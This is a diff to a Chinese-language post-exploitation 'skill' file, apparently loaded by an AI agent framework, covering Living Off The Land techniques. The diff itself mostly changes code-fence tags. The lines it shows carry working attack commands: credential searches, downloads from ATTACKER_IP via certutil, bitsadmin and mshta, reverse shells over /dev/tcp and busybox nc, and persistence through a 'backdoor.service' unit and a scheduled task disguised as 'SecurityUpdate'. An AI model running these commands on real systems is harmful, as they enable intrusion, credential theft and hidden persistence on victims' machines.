@@ -4,7 +4,6 @@ description: 'Living Off The Land：不用上传工具，用系统自带二进�
 disable-model-invocation: true
 metadata: { domain: linux, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # Living Off The Land (LOTL)
 
@@ -25,7 +24,7 @@ systeminfo; ver; hostname; whoami /all; set
 tasklist /v; netstat -ano; ipconfig /all; route print
 qwinsta  # 谁登录了 (RDP sessions)
 net user; net localgroup; net group /domain
-```
+```text
 
 ### 文件/凭据搜索
 ```bash
@@ -40,7 +39,7 @@ dir /s C:\*.xml C:\*.ini C:\*.config C:\*.conf > find.txt
 findstr /si password *.xml *.ini *.txt
 reg query HKLM /f password /t REG_SZ /s
 type %USERPROFILE%\AppData\Local\.bash_history 2>nul
-```
+```text
 
 ### 网络侦察
 ```bash
@@ -51,7 +50,7 @@ timeout 2 bash -c 'echo >/dev/tcp/10.0.0.1/445 && echo OPEN || echo CLOSED' 2>/d
 # Windows
 net view; net view /domain; netstat -ano | findstr ESTABLISHED
 nslookup DOMAIN_CONTROLLER; ping -n 1 HOST
-```
+```text
 
 ## 文件传输 (File Transfer)
 
@@ -70,7 +69,7 @@ certutil -encode stolen.txt tmp.b64 && type tmp.b64
 
 # === certutil 直接上传 (Windows) ===
 certutil -urlcache -split -f http://ATTACKER_IP:8080/tool.exe C:\Windows\Temp\t.exe
-```
+```text
 
 ### 入站 (下载工具 → 受害机)
 ```bash
@@ -90,7 +89,7 @@ bitsadmin /transfer job /download /priority high http://ATTACKER_IP:8080/tool.ex
 
 # === Windows mshta (远程 VBS/JS) ===
 mshta http://ATTACKER_IP:8080/payload.hta
-```
+```text
 
 ## 执行 (Code Execution)
 
@@ -107,7 +106,7 @@ find /etc -name passwd -exec /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 
 
 # === busybox (嵌入式系统) ===
 busybox nc ATTACKER_IP 4444 -e /bin/sh
-```
+```text
 
 ### Windows 无 powershell.exe (被 AppLocker 拦)
 ```bash
@@ -128,7 +127,7 @@ mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c whoami"":cl
 
 # === wmic ===
 wmic process call create "cmd.exe /c whoami"
-```
+```text
 
 ## 持久化 (Persistence)
 
@@ -152,7 +151,7 @@ Restart=always
 WantedBy=default.target
 EOF
 systemctl --user enable --now backdoor.service
-```
+```text
 
 ### Windows
 ```bash
@@ -164,7 +163,7 @@ schtasks /create /sc minute /mo 10 /tn "SecurityUpdate" /tr "cmd.exe /c whoami" 
 
 # === WMI 事件订阅 (无文件落地) ===
 wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE ...
-```
+```text
 
 ## 交互 Shell 升级
 
@@ -179,14 +178,14 @@ busybox sh                                              # 嵌入式
 stty raw -echo; fg; reset
 export TERM=xterm-256color
 exec /bin/bash -i
-```
+```text
 
 ## 快速记忆口诀
 
-```
+```yaml
 侦察: id, sudo -l, ps aux, ss -ntlp, env, find writable
 传输: certutil (Win), /dev/tcp (Linux), base64 (通用)
 执行: bash -i >& /dev/tcp, awk system(), find -exec, mshta (Win)
 升级: python3 pty.spawn
 持久: crontab, .bashrc, registry Run
-```
+```text
